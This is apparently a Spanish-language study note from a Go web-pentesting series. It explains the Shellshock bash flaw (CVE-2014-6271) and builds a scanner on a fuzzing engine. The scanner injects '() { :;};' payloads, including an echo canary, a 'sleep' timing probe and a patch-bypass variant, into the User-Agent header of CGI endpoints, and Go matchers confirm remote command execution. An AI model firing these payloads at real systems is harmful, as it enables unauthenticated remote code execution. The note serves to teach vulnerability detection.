---
tags:
  - Go
  - Go/Web
  - Shellshock
Descripción: "Shellshock (CVE-2014-6271): los scripts CGI vuelcan las cabeceras HTTP como variables de entorno para bash, y una cabecera con una definición de función maliciosa () { :;}…"
Fecha de actualización: 2026-07-26
Nota previa: "[[02 - Escáner de XSS reflejado]]"
Nota siguiente: 
Area: "[[Escáner de vulnerabilidades web.base|Escáner de vulnerabilidades web]]"
---
---

Shellshock (`CVE-2014-6271`): los scripts CGI vuelcan las cabeceras HTTP como variables de entorno para bash, y una cabecera con una **definición de función maliciosa** `() { :;}; <comando>` hace que bash ejecute el comando al arrancar. La teoría vive en Red Team [[01 - Shellshock]] y [[00 - Introducción a Command Injection]]; aquí el escáner sobre el [[00 - Motor de fuzzing web|motor de fuzzing]].

> [!info]+ Fuente y vigencia
> Receta "Shellshock checking" de *Python Web Penetration Testing Cookbook* (2015). <mark style="background: #FFB8EBA6;">Es un CVE de 2014</mark>: en una web moderna casi no lo verás, pero sigue vivo en CGI legacy, *appliances*, routers, dispositivos IoT/embebidos y sistemas sin parchear. Vale la pena tenerlo en el arsenal para objetivos viejos.

## Payloads: el original y los bypasses del parche

El primer parche fue incompleto, así que hay variantes (`CVE-2014-6278`, `-7169`) que saltan fixes a medias. Pruebas varias, y con dos estrategias de confirmación — eco de un canario y retardo por tiempo:

```go
func shellshockPayloads(canary string) []string {
    return []string{
        "() { :;}; echo; echo " + canary,                  // eco: el canario vuelve en el body
        "() { :;}; /bin/sleep 9",                          // ciego por tiempo
        "() { _; } >_[$($())] { echo; echo " + canary + "; }",   // variante CVE-2014-6278
    }
}
```

## Dos matchers: eco y timing

El **eco** es la señal limpia: si el canario aparece en la respuesta, bash ejecutó tu `echo`. El **timing** es el plan B cuando la salida no se refleja — el `sleep` retarda la respuesta frente al baseline:

```go
func echoMatcher(canary string) Matcher {
    return func(payload string, resp *http.Response, body []byte, _ time.Duration) (Finding, bool) {
        if bytes.Contains(body, []byte(canary)) {
            return Finding{Payload: payload, Evidence: "canario ejecutado (echo)"}, true
        }
        return Finding{}, false
    }
}

func timingMatcher(baseline, sleep time.Duration) Matcher {
    return func(payload string, _ *http.Response, _ []byte, elapsed time.Duration) (Finding, bool) {
        if elapsed > baseline+sleep-2*time.Second {   // margen para ruido de red
            return Finding{Payload: payload, Elapsed: elapsed, Evidence: "retardo ~sleep → RCE ciego"}, true
        }
        return Finding{}, false
    }
}
```

Inyectas en las cabeceras que CGI pasa a bash (`User-Agent`, `Referer`, `Cookie`) contra el endpoint CGI:

```go
t := Target{
    Method:  http.MethodGet,
    URL:     "https://target.tld/cgi-bin/status.cgi",
    Headers: map[string]string{"User-Agent": "§FUZZ§"},
}
findings := Fuzz(ctx, t, shellshockPayloads(canary), echoMatcher(canary), client, 5, 10)
```

## Modernizaciones sobre el recetario

- **Doble confirmación** (eco + timing), no solo una — el timing pilla los casos donde la salida del comando no vuelve en el body.
- **Variantes del bypass del parche**, que el original de 2014 no incluía.
- **Baseline de timing** calibrado (mides la latencia normal antes) — reusa el principio del [[05 - Detección de SQLi y baseline de timing|baseline de SQLi]].
- **Targeting de endpoints CGI** (`/cgi-bin/`, `.cgi`, `.sh`) que descubres antes con el [[01 - Content discovery - directorios y ficheros|content discovery]].

> [!warning]+ Un hallazgo aquí es RCE directo
> Shellshock no es "un bug más": es <mark style="background: #FFB86CA6;">ejecución de comandos remota sin autenticar</mark>. En cuanto confirmas el eco, tienes RCE — trátalo con el cuidado (y la autorización) que merece. La explotación completa y post-explotación, en Red Team [[01 - Shellshock]].

---

Cierras el escáner de vulnerabilidades: un motor de fuzzing con matchers especializados para traversal, XSS y Shellshock. La inyección reina —SQL Injection— tiene su propio tratamiento en Go (detección ciega, boolean y time-based, evasión de WAF), como extensión del [[01 - Fuzzer de SQL injection|fuzzer error-based]] → [[05 - Detección de SQLi y baseline de timing]]. El siguiente bloque de esta serie web ataca el protocolo mismo: métodos y manipulación de cabeceras HTTP → [[00 - Testing de métodos HTTP y fingerprinting]].
